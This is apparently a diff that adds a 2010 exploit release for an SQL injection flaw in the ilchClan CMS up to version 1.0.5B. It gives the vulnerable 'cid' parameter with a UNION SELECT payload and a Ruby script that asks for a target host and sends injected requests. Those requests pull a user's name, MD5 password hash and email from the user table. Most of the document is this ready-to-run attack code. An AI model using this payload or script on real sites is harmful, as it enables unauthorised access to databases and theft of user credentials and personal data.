@@ -1,0 +1,76 @@
+----------------------------Information------------------------------------------------
++Name :ilchClan <= 1.0.5B SQL Injection Vulnerability Exploit
++Autor : Easy Laster
++ICQ : 11-051-551
++email : exploit@gaza.net
++Date   : 15.04.2010
++Script  : ilchClan <= 1.0.5B
++Download : http://www.ilch.de/downloads-show-106.html
++Price : for free
++Language :PHP
++Discovered by Easy Laster
++Security Group 4004-Security-Project 4004-security-project.com
++And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
+Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
+N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101
+ 
+---------------------------------------------------------------------------------------
+                                                                                      
+ ___ ___ ___ ___                         _ _           _____           _         _  
+| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
+|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
+  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_| 
+                                              |___|                 |___|           
+ 
+ 
+----------------------------------------------------------------------------------------
++Vulnerability : www.page.com/ilchClan105b/?m=downloads&cid=
++Exploitable   : www.page.com/ilchClan105b/?m=downloads&cid=1+and+1=0+union+select+1,
+concat(name,0x3a,pass,0x3a,email)+from+ilchClan_user+where+id=1--
+-----------------------------------------------------------------------------------------
+#!/usr/bin/ruby
+#4004-security-project.com
+#Discovered and vulnerability by Easy Laster
+require 'net/http'
+print "
+#########################################################
+#                   4004-Security-Project               #
+#########################################################
+#               ilchClan <= 1.0.5B SQL Injection        #
+#                          Exploit                      #
+#               Using Host+Path+userid+prefix           #
+#           www.demo.de /ilchclan/ 1 ilchClan_user      #
+#                         Easy Laster                   #
+#########################################################
+"
+block = "#########################################################"
+print ""+ block +""
+print "\nEnter host name (site.com)->"
+host=gets.chomp
+print ""+ block +""
+print "\nEnter script path (/forum/)->"
+path=gets.chomp
+print ""+ block +""
+print "\nEnter script path (userid)->"
+userid=gets.chomp
+print ""+ block +""
+print "\nEnter script path (prefix z.b ilchClan_user)->"
+prefix=gets.chomp
+print ""+ block +""
+begin
+dir = "?m=downloads&cid=1+and+1=0+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,name,0x23,0x23,0x23,0x23,0x23)+from+"+ prefix +"+where+id="+ userid +"--"
+http = Net::HTTP.new(host, 80)
+resp= http.get(path+dir)
+print "\nThe Username is  -> "+(/#####(.+)#####/).match(resp.body)[1]
+dir = "?m=downloads&cid=1+and+1=0+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,pass,0x23,0x23,0x23,0x23,0x23)+from+"+ prefix +"+where+id="+ userid +"--"
+http = Net::HTTP.new(host, 80)
+resp= http.get(path+dir)
+print "\nMD5 Password Hash is -> "+(/#####(.+)#####/).match(resp.body)[1]
+dir = "?m=downloads&cid=1+and+1=0+union+select+1,concat(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23)+from+"+ prefix +"+where+id="+ userid +"--"
+http = Net::HTTP.new(host, 80)
+resp= http.get(path+dir)
+print "\nThe Email  is -> "+(/#####(.+)#####/).match(resp.body)[1]
+print "\n"+ block +""
+rescue
+print "\nExploit failed"
+end
